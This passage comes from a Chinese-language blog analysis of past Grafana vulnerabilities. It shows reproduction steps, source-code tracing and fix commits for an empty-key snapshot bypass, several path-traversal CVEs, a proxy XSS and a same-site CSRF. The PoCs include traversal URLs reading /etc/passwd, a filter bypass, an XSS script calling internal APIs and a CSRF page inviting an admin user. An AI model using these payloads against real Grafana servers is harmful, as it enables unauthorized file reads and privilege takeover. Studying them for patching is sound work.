<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;gopkg.in/macaron.v1&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	m := macaron.Classic()</span><br><span class="line">	m.Get(<span class="string">&quot;/hello/:name&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx *macaron.Context)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">		name := ctx.Params(<span class="string">&quot;:name&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%T,%d,%s&quot;</span>, name, <span class="built_in">len</span>(name), name)</span><br><span class="line">	&#125;)</span><br><span class="line">	m.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果不向占位符的地方传入数据或者传入和占位符完全一样的字符串，那么得到的参数就会是空字符串，例如访问这两个路径：<code>/hello//</code>、<code>/hello/:name</code>，那么得到的结果都是<code>string,0,</code>。</p>
<p>回到Grafana的代码中，<code>/api/snapshots/:key</code>路由对应的具体逻辑在<code>pkg/api/dashboard_snapshot.go:147</code>，而<code>:key</code>的本意是快照的key，此时为空字符串</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808225317771.png" alt="image-20230808225317771"></p>
<p><code>bus.Dispatch(query)</code>是Grafana中的<a href="https://xumc.github.io/blog/2018/07/25/grafana-inside">bus机制</a>，跳过这里，直接到获取快照的具体逻辑：<code>pkg/services/sqlstore/dashboard_snapshot.go:90</code></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808230801960.png" alt="image-20230808230801960"></p>
<p>其中<code>x</code>是定义于<code>pkg/services/sqlstore/sqlstore.go:32</code>的全局变量，为XORM Engine。</p>
<p>XORM的<a href="https://xorm.io/zh/docs/chapter-05/3.get/">Get方法</a>的其中一个用法如下：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809000602775.png" alt="image-20230809000602775"></p>
<p>根据”已有的非空数据”来获取单条数据，如果数据都为空呢，测试发现会返回数据表的第一条数据，而如果数据为0，空字符串这种情况，也等同于空，例如下代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	_ <span class="string">&quot;github.com/mattn/go-sqlite3&quot;</span></span><br><span class="line">	<span class="string">&quot;xorm.io/xorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id   <span class="type">int64</span></span><br><span class="line">	Name <span class="type">string</span> <span class="string">`xorm:&quot;varchar(25)&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> engine *xorm.Engine</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initData</span><span class="params">()</span></span> &#123;</span><br><span class="line">	engine.CreateTables(<span class="built_in">new</span>(User))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">		user := <span class="built_in">new</span>(User)</span><br><span class="line">		user.Name = <span class="string">&quot;leixiao&quot;</span></span><br><span class="line">		engine.Insert(user)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getData</span><span class="params">(id <span class="type">int64</span>, name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: id, Name: name&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Query : %+v\n&quot;</span>, user)</span><br><span class="line">	has, _ := engine.Get(user)</span><br><span class="line">	<span class="keyword">if</span> has &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: %+v\n&quot;</span>, user)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: nil\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDataEmpty</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Query : %+v\n&quot;</span>, user)</span><br><span class="line">	has, _ := engine.Get(user)</span><br><span class="line">	<span class="keyword">if</span> has &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: %+v\n&quot;</span>, user)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: nil\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	engine, err = xorm.NewEngine(<span class="string">&quot;sqlite3&quot;</span>, <span class="string">&quot;./test.db&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	initData()</span><br><span class="line"></span><br><span class="line">	getDataEmpty()</span><br><span class="line">	fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	getData(<span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回结果将为：</p>
<blockquote>
<p>Query : &amp;{Id:0 Name:}<br>Result: &amp;{Id:1 Name:leixiao}</p>
<p>Query : &amp;{Id:0 Name:}<br>Result: &amp;{Id:1 Name:leixiao}</p>
</blockquote>
<p>所以，当这里的<code>Key</code>和<code>DeleteKey</code>都为空字符串时，最终查询结果为数据表的第一条数据</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809001253404.png" alt="image-20230809001253404"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>8.1.6修复方案如下：</p>
<p><a href="https://github.com/grafana/grafana/commit/2d456a6375855364d098ede379438bf7f0667269">https://github.com/grafana/grafana/commit/2d456a6375855364d098ede379438bf7f0667269</a></p>
<p>主要是修复了两处，第一处修复相当于给Macaron打了个补丁，修复了前文提到的如果向占位符的地方传入和占位符完全一样的字符串，那么得到的参数就会是空字符串的问题</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809095608186.png" alt="image-20230809095608186"></p>
<p>但是这里是可以绕过的，也是前文提到的传入空数据，我搭了8.1.6的调试环境，测试结果如下：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100109265.png" alt="image-20230809100109265"></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100041876.png" alt="image-20230809100041876"></p>
<p>另一处修复是检查<code>key</code>参数长度是否为0，也就是判断是否为空字符串，这里就几乎杜绝了绕过的可能</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100415312.png" alt="image-20230809100415312"></p>
<h2 id="CVE-2021-43798（路径穿越任意文件读取）"><a href="#CVE-2021-43798（路径穿越任意文件读取）" class="headerlink" title="CVE-2021-43798（路径穿越任意文件读取）"></a>CVE-2021-43798（路径穿越任意文件读取）</h2><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 8.0.0 - 8.3.0</p>
<p><strong>Patched versions</strong>: 8.3.1, 8.2.7, 8.1.8, 8.0.7</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>依然使用8.1.0的版本，POC里将url路径中的<code>/</code>url编码是为了防止浏览器自动进行URL路径规范化</p>
<p><a href="http://127.0.0.1:3000/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd">http://127.0.0.1:3000/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd</a></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809114013245.png" alt="image-20230809114013245"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.Get(<span class="string">&quot;/public/plugins/:pluginId/*&quot;</span>, hs.GetPluginAssets)</span><br></pre></td></tr></table></figure>

<p>这里看出这是个前台漏洞，也就是不需要身份验证的。</p>
<p>路由对应的具体逻辑在：pkg&#x2F;api&#x2F;plugins.go:260</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809115705806.png" alt="image-20230809115705806"></p>
<p>逻辑很简单，就是参数<code>c.Params(&quot;*&quot;)</code>被拼接到文件路径，然后响应返回文件内容。问题在于参数中的”..&#x2F;“并没有被正确过滤从而导致了路径穿越，而为什么<code>filepath.Clean</code>函数没有处理”..&#x2F;“，可以看官方文档对<a href="https://pkg.go.dev/path/filepath#Clean">该函数的解释</a>，简单来说就是路径以<code>/</code>开头才会处理”..&#x2F;“</p>
<p>例如下代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(filepath.Clean(<span class="string">&quot;/xxx/../etc/passwd&quot;</span>))</span><br><span class="line">	fmt.Println(filepath.Clean(<span class="string">&quot;../etc/passwd&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果为:</p>
<blockquote>
<p>&#x2F;etc&#x2F;passwd<br>..&#x2F;etc&#x2F;passwd</p>
</blockquote>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce">https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce</a></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809123351013.png" alt="image-20230809123351013"></p>
<p>首先是给路径参数前面拼接了<code>/</code>，然后再通过<code>filepath.Clean</code>函数处理，这样也基本就解决了路径穿越的问题。然后通过<code>filepath.Rel</code>函数获取路径相当于<code>/</code>的相对路径，最后拿相对路径和PluginDir进行路径拼接，这样最终的文件路径就只能是PluginDir下的文件</p>
<h2 id="CVE-2021-43813（路径穿越-md文件读取）"><a href="#CVE-2021-43813（路径穿越-md文件读取）" class="headerlink" title="CVE-2021-43813（路径穿越.md文件读取）"></a>CVE-2021-43813（路径穿越.md文件读取）</h2><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 5.0.0 - 8.3.1</p>
<p><strong>Patched versions</strong>: 8.3.2, 7.5.12</p>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用8.1.0或8.3.1的版本，先进入容器，创建除了后缀名，路径分别为全大写和全小写的md文件</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">mkdir /lower; echo lower &gt; /lower/file.md</span><br><span class="line">mkdir /UPPER; echo upper &gt; /UPPER/FILE.md</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<p><a href="http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fupper%2ffile">http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fupper%2ffile</a></p>
<p><a href="http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2flower%2ffile">http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2flower%2ffile</a></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809140928365.png" alt="image-20230809140928365"></p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="8-1-0"><a href="#8-1-0" class="headerlink" title="8.1.0"></a>8.1.0</h4><p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.Group(<span class="string">&quot;/api&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(apiRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  apiRoute.Get(<span class="string">&quot;/plugins/:pluginId/markdown/:name&quot;</span>, routing.Wrap(hs.GetPluginMarkdown))</span><br><span class="line">  ...</span><br><span class="line">&#125;, reqSignedIn)</span><br></pre></td></tr></table></figure>

<p>这里的<code>reqSignedIn</code>意味着需要登录</p>
<p>然后到pkg&#x2F;api&#x2F;plugins.go:181</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809141406618.png" alt="image-20230809141406618"></p>
<p>到pkg&#x2F;plugins&#x2F;manager&#x2F;manager.go:696，对name进行大&#x2F;小写转换，然后和PluginDir进行拼接，导致了目录穿越</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809141511148.png" alt="image-20230809141511148"></p>
<h4 id="8-3-1"><a href="#8-3-1" class="headerlink" title="8.3.1"></a>8.3.1</h4><p>路由定义和8.1.0是一样的</p>
<p>继续看到pkg&#x2F;api&#x2F;plugins.go:188，这里调用Markdown插件的代码有点不同</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809145815252.png" alt="image-20230809145815252"></p>
<p>pkg&#x2F;api&#x2F;plugins.go:483</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809145906774.png" alt="image-20230809145906774"></p>
<p>不过漏洞整体的流程和逻辑是一样的</p>
<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>8.3.2修复如下：</p>
<p><a href="https://github.com/grafana/grafana/commit/e0842b265f82806fde785c546f1637acdfaf5685">https://github.com/grafana/grafana/commit/e0842b265f82806fde785c546f1637acdfaf5685</a></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809150602387.png" alt="image-20230809150602387"></p>
<p>对传入的路径参数用<code>mdFilepath</code>函数处理，而<code>mdFilepath</code>函数内是使用<code>filepath.Clean</code>进行处理，和CVE-2021-43798修复类似</p>
<h2 id="CVE-2021-43815（路径穿越csv文件读取）"><a href="#CVE-2021-43815（路径穿越csv文件读取）" class="headerlink" title="CVE-2021-43815（路径穿越csv文件读取）"></a>CVE-2021-43815（路径穿越csv文件读取）</h2><h3 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 8.0.0-beta3 - 8.3.1<br><strong>Patched versions</strong>: 8.3.2</p>
<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用8.3.1版本，先进入容器，创建一个csv文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;id,name\n1,leixiao\n2,l3yx&quot;</span> &gt; /test.csv</span><br></pre></td></tr></table></figure>

<p>按照<a href="https://grafana.com/docs/grafana/latest/datasources/testdata/">TestData data source</a>的步骤添加TestData数据源，然后进入Explore页面，选择<code>TestData DB</code>，然后选择一个csv文件并抓包</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810004320427.png" alt="image-20230810004320427"></p>
<p>修改<code>queries.csvFileName</code>字段可目录穿越读取任意csv文件</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810004815084.png" alt="image-20230810004815084"></p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>一开始是看<a href="https://github.com/grafana/grafana/security/advisories/GHSA-7533-c8qv-jm9m">官方github信息</a>得知漏洞url是<code>/api/ds/query</code>，然后直接从该路由入手分析漏洞，但发现定位到漏洞点有些困难，其中的功能点调用逻辑有点复杂，然后从<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43815">cve页面</a>找到漏洞的<a href="https://github.com/grafana/grafana/commit/d6ec6f8ad28f0212e584406730f939105ff6c6d3">修复信息</a>，得知最后的漏洞点为<code>pkg/tsdb/testdatasource/csv_data.go</code>，然后由<code>loadCsvFile</code>函数倒推调用路径，但最终只推到<code>pkg/tsdb/testdatasource/scenarios.go:198</code></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810010326392.png" alt="image-20230810010326392"></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810010448109.png" alt="image-20230810010448109"></p>
<p>看样子是先注册函数或功能，调用时在根据<code>ID</code>去动态调用对应的功能点。然后发现这些文件都在<code>testdatasource</code>这个目录，根据关键字很容易搜到<a href="https://grafana.com/docs/grafana/latest/datasources/testdata/">官方文档</a>，按照文档测试并抓包，得到预期中的数据包，其中<code>scenarioId</code>字段也就对应各个功能的<code>ID</code></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810011415214.png" alt="image-20230810011415214"></p>
<p>搞清楚调用逻辑后再正向分析一下漏洞。</p>
<p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.Group(<span class="string">&quot;/api&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(apiRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  apiRoute.Post(<span class="string">&quot;/ds/query&quot;</span>, authorize(reqSignedIn, ac.EvalPermission(ActionDatasourcesQuery)), bind(dtos.MetricRequest&#123;&#125;), routing.Wrap(hs.QueryMetricsV2))</span><br><span class="line">	...</span><br><span class="line">&#125;, reqSignedIn)</span><br></pre></td></tr></table></figure>

<p>中间的调用逻辑很长而且有点复杂，直接跳过，到pkg&#x2F;tsdb&#x2F;testdatasource&#x2F;csv_data.go:46，这里就是处理<code>csv_file</code>的具体逻辑</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810013336028.png" alt="image-20230810013336028"></p>
<p>pkg&#x2F;tsdb&#x2F;testdatasource&#x2F;csv_data.go:75，这里只是做了简单的正则判断便直接拼接路径，导致了目录穿越。这里的正则也可以轻易绕过：<code>xxx.csv/../../../../../../etc/passwd</code>，不过当前的环境是无法读取<code>/etc/passwd</code>文件的，在<code>LoadCsvContent</code>函数中是默认将文件以csv的格式进行读取，但是<code>/etc/passwd</code>最后一行有几个逗号，行之间逗号数不匹配会导致读取错误</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810013541777.png" alt="image-20230810013541777"></p>
<p><code>/etc/hosts</code>倒是可以读取：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810014730199.png" alt="image-20230810014730199"></p>
<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/grafana/grafana/commit/d6ec6f8ad28f0212e584406730f939105ff6c6d3#diff-2482b47469df54a2bdcb0870bfca4ac5f190027bf13d0c404cbd470d226576e5">https://github.com/grafana/grafana/commit/d6ec6f8ad28f0212e584406730f939105ff6c6d3#diff-2482b47469df54a2bdcb0870bfca4ac5f190027bf13d0c404cbd470d226576e5</a></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810011703730.png" alt="image-20230810011703730"></p>
<p>修复方法同CVE-2021-43813，并且正则更严谨了</p>
<h2 id="CVE-2022-21702（Proxy-XSS）"><a href="#CVE-2022-21702（Proxy-XSS）" class="headerlink" title="CVE-2022-21702（Proxy XSS）"></a>CVE-2022-21702（Proxy XSS）</h2><h3 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 2.0.0-beta1 - 8.3.4<br><strong>Patched versions</strong>: 8.3.5, 7.5.15</p>
<h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考<a href="https://github.com/grafana/grafana/security/advisories/GHSA-xc3p-28hw-q24g">官方说明</a>，很容易推断复现步骤：</p>
<h4 id="数据源Proxy"><a href="#数据源Proxy" class="headerlink" title="数据源Proxy"></a>数据源Proxy</h4><p>使用8.3.1版本，创建一个基于HTTP的数据源，例如Elasticsearch，访问模式设置成<code>Server</code>，URL设置为攻击者可控的地址</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810031537183.png" alt="image-20230810031537183"></p>
<p>在该URL的Web服务中放入XSS页面。Grafana的Cookie是HttpOnly的，所以无法获取Cookie，但是可以直接请求接口，例如xss.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/api/org/users&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="title class_">XMLHttpRequest</span>.<span class="property">DONE</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(xhr.<span class="property">status</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<code>/datasources</code>页面可以抓包获取数据源的id，用id可以构造出如下地址：<code>/api/datasources/proxy/:id/xss.html</code></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810032245092.png" alt="image-20230810032245092"></p>
<h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/grafana/grafana/commit/27726868b3d7c613844b55cd209ca93645c99b85">https://github.com/grafana/grafana/commit/27726868b3d7c613844b55cd209ca93645c99b85</a></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810035135187.png" alt="image-20230810035135187"></p>
<p>csp设置为sandbox</p>
<h2 id="CVE-2022-21703（同站CSRF）"><a href="#CVE-2022-21703（同站CSRF）" class="headerlink" title="CVE-2022-21703（同站CSRF）"></a>CVE-2022-21703（同站CSRF）</h2><h3 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &gt;&#x3D;v3.0-beta1<br><strong>Patched versions</strong>: 8.3.5, 7.5.15</p>
<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考 <a href="https://jub0bs.com/posts/2022-02-08-cve-2022-21703-writeup/">CVE-2022-21703: cross-origin request forgery against Grafana</a></p>
<p>使用8.3.1版本，POC所在地址和Grafana必须同站，如<a href="http://127.0.0.1:8080/csrf.html%E5%92%8Chttp://127.0.0.1:3000/">http://127.0.0.1:8080/csrf.html和http://127.0.0.1:3000/</a> (Grafana)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">csrf</span>(<span class="params">name, email</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> url = <span class="string">&quot;http://127.0.0.1:3000/api/org/invites&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> data = &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;name&quot;</span>: name,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;loginOrEmail&quot;</span>: email,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;role&quot;</span>: <span class="string">&quot;Admin&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;sendEmail&quot;</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> opts = &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">headers</span>: &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain; application/json&quot;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(url, opts);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="title 